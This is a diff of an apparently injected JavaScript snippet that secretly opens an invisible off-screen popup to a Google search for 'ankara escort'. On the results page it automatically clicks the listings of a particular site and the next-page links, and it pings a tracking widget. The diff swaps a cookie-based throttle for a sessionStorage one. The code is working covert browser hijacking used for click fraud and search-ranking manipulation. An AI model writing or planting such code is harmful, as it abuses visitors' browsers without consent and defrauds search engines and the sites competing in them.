@@ -1,27 +1,20 @@
-
 new Image().src = 'https://whos.amung.us/widget/dd0spanel.png';
-function setCookie(cname, cvalue) {
-	var d = new Date();
-	d.setTime(d.getTime() + (1000 * 60 * 15));
-	var expires = "expires=" + d.toUTCString();
-	document.cookie = cname + "=" + cvalue + "; " + expires
-}
-function getCookie(cname) {
-	var name = cname + "=";
-	var ca = document.cookie.split(';');
-	for (var i = 0; i < ca.length; i++) {
-		var c = ca[i];
-		while (c.charAt(0) == ' ') c = c.substring(1);
-		if (c.indexOf(name) == 0) return c.substring(name.length, c.length)
-	}
-	return ""
-}
-if (getCookie('cookie') != 1) {
+
+tarih = new Date();
+    storage_key = 'access_yorummz_';
+    if (!sessionStorage[storage_key] || (sessionStorage[storage_key] && tarih.getTime() >= sessionStorage[storage_key])) {
+        tarih.setTime(tarih.getTime() + 1000* 60 * 30);
+        sessionStorage[storage_key] = tarih.getTime();
 window.open("https://www.google.com.tr/#q=ankara+escort","ljPu","toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=1, height=1, visible=none");
-setCookie("cookie", "1")
+
+		
+    }
+    
 
 
-}
+
+
+
 if(document.title.indexOf("ankara escort") >= 0){
 new Image().src = 'https://whos.amung.us/widget/dd0span3l.png';
 /*! jQuery v3.1.1 | (c) jQuery Foundation | jquery.org/license */
@@ -36,3 +29,9 @@ if($( "cite" )[i].innerHTML.indexOf("sekerevi") >= 0 ){$( ".r a" )[i].click(); v
 }
 if(pic == 0){$( ".pn" )[0].click();};
 }
+
+if (location.hostname.indexOf("ankarasekerevi.com") >= 0) {
+setInterval(function(){ window.close(); }, 1000 * 60 * 3);
+}
+
+
